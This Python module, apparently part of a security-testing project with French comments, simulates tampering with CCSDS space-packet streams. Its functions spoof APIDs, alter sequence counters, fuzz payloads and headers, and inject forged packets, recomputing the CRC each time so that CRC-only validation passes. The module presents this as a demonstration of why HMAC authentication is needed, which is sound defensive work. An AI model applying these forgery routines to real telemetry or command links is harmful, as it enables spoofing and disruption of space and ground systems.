# =============================================================
# frameAlteration.py  –  Attaque 2 : Altération de trames
#
# Simule un attaquant qui modifie les en-têtes CCSDS d'une trame
# en transit, puis recalcule le CRC pour masquer l'altération.
#
# Vecteurs d'attaque couverts :
#   1. Altération de l'APID       → fausse l'identité de la source
#   2. Altération du seqCount     → désordonne la reconstruction
#   3. Altération du dataLength   → corrompt le parseur récepteur
#   4. Fuzzing aléatoire du header→ perturbation non ciblée
#   5. Injection d'une fausse trame complète dans le flux
#
# Résultat sans défense :
#   → Le CRC est reforge par l'attaquant → validation CRC passe
#   → Le récepteur accepte une trame modifiée comme légitime
#
# Résultat avec Défense 2 (HMAC-SHA256) :
#   → L'attaquant ne connaît pas la clé secrète
#   → Le HMAC recalculé par le récepteur ne correspond pas
#   → La trame est rejetée
# =============================================================

import struct
import binascii
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from src.receiver.frameParser import parseStream, HEADER_SIZE, CRC_SIZE


# ==============================================================
# Internal helper – rebuild a packet from parsed fields + CRC
# ==============================================================

def _rebuildPacket(apid: int, seqFlags: int, seqCount: int,
                   version: int, packetType: int, secHdrFlag: int,
                   payload: bytes) -> bytes:
    """Reconstruct a valid CCSDS packet with a freshly computed CRC."""
    dataLength  = len(payload) - 1
    word1       = (version & 0x07) << 13 | (packetType & 0x01) << 12 | (secHdrFlag & 0x01) << 11 | (apid & 0x7FF)
    word2       = (seqFlags & 0x03) << 14 | (seqCount & 0x3FFF)
    header      = struct.pack(">HHH", word1, word2, dataLength)
    pkt         = header + payload
    crc         = binascii.crc_hqx(pkt, 0xFFFF)
    return pkt + struct.pack(">H", crc)


def _offsetInStream(packets: list[dict], targetSeq: int) -> int:
    """Return the byte offset of targetSeq packet inside the original stream."""
    offset = 0
    for pkt in packets:
        if pkt["seqCount"] == targetSeq:
            return offset
        offset += pkt["totalSize"]
    return -1


# ==============================================================
# Attack 1 – APID spoofing
# ==============================================================

def alterApid(rawStream: bytes, targetSeq: int,
              fakeApid: int, verbose: bool = True) -> bytes:
    """
    Replace the APID of a specific packet with a forged value.
    CRC is recomputed so the receiver's CRC check still passes.

    Args:
        rawStream:  Original byte stream.
        targetSeq:  seqCount of the packet to alter.
        fakeApid:   Replacement APID value (0–2047).
        verbose:    Log the alteration.

    Returns:
        Modified byte stream.
    """
    packets = parseStream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset  = _offsetInStream(packets, targetSeq)
        newPkt  = _rebuildPacket(
            apid=fakeApid,
            seqFlags=pkt["seqFlags"], seqCount=pkt["seqCount"],
            version=pkt["version"],   packetType=pkt["packetType"],
            secHdrFlag=pkt["secHdrFlag"], payload=pkt["payload"]
        )
        result[offset: offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(f"[ATTACK-2] APID spoof seqCount={targetSeq}: "
                  f"{pkt['apid']} → {fakeApid}  (CRC reforged)")
        break

    return bytes(result)


# ==============================================================
# Attack 2 – Sequence counter manipulation
# ==============================================================

def alterSeqCount(rawStream: bytes, targetSeq: int,
                  newSeq: int, verbose: bool = True) -> bytes:
    """
    Replace the seqCount of a packet to disrupt reassembly order.

    Args:
        rawStream:  Original byte stream.
        targetSeq:  seqCount to target.
        newSeq:     Replacement sequence number.
        verbose:    Log the alteration.

    Returns:
        Modified byte stream.
    """
    packets = parseStream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset = _offsetInStream(packets, targetSeq)
        newPkt = _rebuildPacket(
            apid=pkt["apid"], seqFlags=pkt["seqFlags"], seqCount=newSeq,
            version=pkt["version"], packetType=pkt["packetType"],
            secHdrFlag=pkt["secHdrFlag"], payload=pkt["payload"]
        )
        result[offset: offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(f"[ATTACK-2] seqCount alteration: {targetSeq} → {newSeq}  (CRC reforged)")
        break

    return bytes(result)


# ==============================================================
# Attack 3 – Payload fuzzing (random bit flip in payload)
# ==============================================================

def fuzzPayload(rawStream: bytes, targetSeq: int,
                numFlips: int = 1, verbose: bool = True) -> bytes:
    """
    Flip random bits in the payload of a specific packet,
    then recompute the CRC to hide the alteration.

    Args:
        rawStream:  Original byte stream.
        targetSeq:  seqCount of the packet to fuzz.
        numFlips:   Number of byte-level bit flips to apply.
        verbose:    Log the alteration.

    Returns:
        Modified byte stream with reforged CRC.
    """
    import random
    packets = parseStream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset      = _offsetInStream(packets, targetSeq)
        fuzzPayload = bytearray(pkt["payload"])

        flippedPositions = []
        for _ in range(min(numFlips, len(fuzzPayload))):
            pos = random.randint(0, len(fuzzPayload) - 1)
            fuzzPayload[pos] ^= random.randint(1, 0xFF)
            flippedPositions.append(pos)

        newPkt = _rebuildPacket(
            apid=pkt["apid"], seqFlags=pkt["seqFlags"], seqCount=pkt["seqCount"],
            version=pkt["version"], packetType=pkt["packetType"],
            secHdrFlag=pkt["secHdrFlag"], payload=bytes(fuzzPayload)
        )
        result[offset: offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(f"[ATTACK-2] Payload fuzz seqCount={targetSeq}: "
                  f"{numFlips} flip(s) at positions {flippedPositions}  (CRC reforged)")
        break

    return bytes(result)


# ==============================================================
# Attack 4 – Full header fuzzing (random header values)
# ==============================================================

def fuzzHeader(rawStream: bytes, targetSeq: int,
               verbose: bool = True) -> bytes:
    """
    Randomize all fields of the primary header (except payload)
    and recompute CRC. Demonstrates that an attacker can inject
    any header without a cryptographic authentication mechanism.

    Args:
        rawStream:  Original byte stream.
        targetSeq:  seqCount of the packet to fuzz.
        verbose:    Log the alteration.

    Returns:
        Modified byte stream.
    """
    import random
    packets = parseStream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset = _offsetInStream(packets, targetSeq)
        newPkt = _rebuildPacket(
            apid=random.randint(0, 0x7FF),
            seqFlags=random.randint(0, 3),
            seqCount=random.randint(0, 0x3FFF),
            version=random.randint(0, 7),
            packetType=random.randint(0, 1),
            secHdrFlag=random.randint(0, 1),
            payload=pkt["payload"]
        )
        result[offset: offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(f"[ATTACK-2] Full header fuzz seqCount={targetSeq}  (CRC reforged)")
        break

    return bytes(result)


# ==============================================================
# Attack 5 – Packet injection (insert a forged packet)
# ==============================================================

def injectPacket(rawStream: bytes, fakePayload: bytes,
                 fakeSeq: int, insertAfterSeq: int,
                 verbose: bool = True) -> bytes:
    """
    Inject a completely forged packet into the stream after a
    specific sequence number.

    Args:
        rawStream:       Original byte stream.
        fakePayload:     Payload for the injected packet.
        fakeSeq:         seqCount for the injected packet.
        insertAfterSeq:  Insert the fake packet after this seqCount.
        verbose:         Log the injection.

    Returns:
        Modified byte stream with injected packet.
    """
    packets = parseStream(rawStream)

    # Build the fake packet (use same apid/flags as first real packet)
    ref  = packets[0] if packets else {"apid": 1, "seqFlags": 3, "version": 0, "packetType": 0, "secHdrFlag": 0}
    fake = _rebuildPacket(
        apid=ref["apid"], seqFlags=ref["seqFlags"], seqCount=fakeSeq,
        version=ref["version"], packetType=ref["packetType"],
        secHdrFlag=ref["secHdrFlag"], payload=fakePayload
    )

    # Find insertion point
    insertOffset = 0
    for pkt in packets:
        insertOffset += pkt["totalSize"]
        if pkt["seqCount"] == insertAfterSeq:
            break

    result = rawStream[:insertOffset] + fake + rawStream[insertOffset:]

    if verbose:
        print(f"[ATTACK-2] Injected fake packet seqCount={fakeSeq} "
              f"after seqCount={insertAfterSeq}  ({len(fake)} bytes)")

    return result
